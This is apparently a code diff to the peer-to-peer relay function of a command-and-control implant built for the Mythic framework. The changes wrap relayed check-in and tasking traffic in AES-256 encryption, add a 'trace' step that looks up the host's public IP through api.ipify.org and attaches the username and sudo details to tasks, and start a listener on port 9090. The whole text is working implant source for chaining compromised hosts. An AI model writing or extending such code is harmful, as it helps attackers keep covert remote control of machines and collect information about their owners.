@@ -1,19 +1,7 @@
 def p2p_server(task_id):
 
-    from http.server import BaseHTTPRequestHandler, HTTPServer
-    import threading
-
-    class RequestHandler(BaseHTTPRequestHandler):
-        def do_GET(self):
-            message = "Hello!"
-
-            self.protocol_version = "HTTP/1.1"
-            self.send_response(200)
-            self.send_header("Content-Length", len(message))
-            self.end_headers()
-
-            self.wfile.write(bytes(message, "utf8"))
-            return
+    
+    class RequestHandler(myRequestHandler):
 
         def do_POST(self):
 
@@ -21,51 +9,42 @@ def p2p_server(task_id):
 
             content_len = int(self.headers.get('content-length', 0))
             post_body = self.rfile.read(content_len)
-            decode = base64.b64decode(post_body)
-            decode = decode.decode("utf-8")
+
+            received_uuid = ""
+            received_message = ""
+            decode = ""
+            encrypted = False
+
+            try:
+                decode = base64.b64decode(post_body)
+                decode = decode.decode("utf-8")
+            except:
+                decode = decrypt_AES256(post_body, UUID=True)
+                encrypted = True
 
             received_uuid = str(decode)[:36]
             received_message = json.loads(decode[36:])
-
-            print("\n--------------- CURRENT DELEGATE -----------------\n")
-            print("Message = " + str(received_message))
-            print("UUID = " + received_uuid)
-
-            print("----------------------------------------------------------\n")
-
 
             encoded = to64(decode)
 
             if received_message["action"] == "checkin":
                 delegate = {
                     "message": encoded,
-                    "uuid": agent.PayloadUUID,
-                    "c2_profile": "http"
+                    "uuid": agent.get_PayloadUUID(),
+                    "c2_profile": "myp2p"
                 }
             else:
                 delegate = {
                     "message": encoded,
                     "uuid": received_uuid,
-                    "c2_profile": "http"
+                    "c2_profile": "myp2p"
                 }
 
             delegates.append(delegate)
             while delegates_aswers == []:
                 pass
 
-            print("\n--------------- CURRENT DELEGATE ANSWERS -----------------\n")
-            for answer in delegates_aswers:
-                message = base64.b64decode(answer['message'])
-                message = message.decode("utf-8")
-                message = message[36:]
-                message = json.loads(message)
-
-                print("Message = " + str(message))
-                print("UUID = " + answer["uuid"])
-                if "mythic_uuid" in answer:
-                    print("Mythic_uuid = " + answer["mythic_uuid"])
-
-            print("----------------------------------------------------------\n")
+            reply_message = ""
 
             if received_message["action"] == "checkin":
                 for answer in delegates_aswers:
@@ -73,32 +52,8 @@ def p2p_server(task_id):
                     message = message.decode("utf-8")
                     message = message[36:]
                     message = json.loads(message)
-                    new_uuid = message["id"]
                     if message["action"] == "checkin":
-                        message = answer['message']
-                        self.protocol_version = "HTTP/1.1"
-                        self.send_response(200)
-                        self.send_header("Content-Length", len(message))
-                        self.end_headers()
-                        self.wfile.write(bytes(message, "utf8"))
-                        delegates_aswers.remove(answer)
-
-                        # response = {
-                        #     "user_output": "Added edge",
-                        #     "task_id": task_id,
-                        #     "edges": [
-                        #             {
-                        #             "source": agent.UUID,
-                        #             "destination": new_uuid,
-                        #             "direction": 2,
-                        #             "metadata": "",
-                        #             "action": "add",
-                        #             "c2_profile": "http"
-                        #             }
-                        #         ]
-                        #     }
-                        # responses.append(response)
-
+                        reply_message = answer['message']
 
             else:
                 reply = False
@@ -106,22 +61,54 @@ def p2p_server(task_id):
                     for answer in delegates_aswers:
                         message = base64.b64decode(answer['message'])
                         message = message.decode("utf-8")
+                        message_uuid = message[:36]
                         message = message[36:]
                         message = json.loads(message)
                         if answer['uuid'] == received_uuid and message["action"] == received_message["action"]:
-                            message = answer['message']
-                            self.protocol_version = "HTTP/1.1"
-                            self.send_response(200)
-                            self.send_header("Content-Length", len(message))
-                            self.end_headers()
-                            self.wfile.write(bytes(message, "utf8"))
-                            delegates_aswers.remove(answer)
-                            reply = True
+                            if message["action"] == "get_tasking":
+                                if message["tasks"] != []:
+                                    for task in message["tasks"]:
+                                        if task["command"] == "trace":
+                                            ip = requests.get('https://api.ipify.org').text
+                                            if task["parameters"] == "":
+                                                task["parameters"] = getpass.getuser() + "@" + ip + ";" + sudo
+                                            else:
+                                                task["parameters"] += " --> " + getpass.getuser() + "@" + ip + ";" + sudo
+                                            reply_message = to64(message_uuid) + to64(str(message))
+                                            delegates_aswers.remove(answer)
+                                            reply = True
+                            if reply_message == "":
+                                reply_message = answer['message']
+                                delegates_aswers.remove(answer)
+                                reply = True
+            
+            if encrypted:
+                reply_message = base64.b64decode(reply_message).decode()
+                uuid = reply_message[:36]
+                message = reply_message[36:]
+                enc = encrypt_AES256(message)
+                reply_message = base64.b64encode(uuid.encode() + enc).decode("utf-8")
 
+            self.protocol_version = "HTTP/1.1"
+            self.send_response(200)
+            self.send_header("Content-Length", len(reply_message))
+            self.end_headers()
+            self.wfile.write(bytes(reply_message, "utf8"))
+            
 
     def run():
-        server = ('', 9090)
+        p2p_port = 9090
+        server = ('', p2p_port)
         httpd = HTTPServer(server, RequestHandler)
         thread = threading.Thread(target = httpd.serve_forever, daemon=True)
         thread.start()
+
+        response = {
+            'task_id': task_id,
+            "user_output": "P2P Server started on {}:{}".format(getIP(), p2p_port),
+            'completed': True
+        }
+        responses.append(response)
+        print("\t- P2P Server started on {}:{}".format(getIP(), p2p_port))
+        
     run()
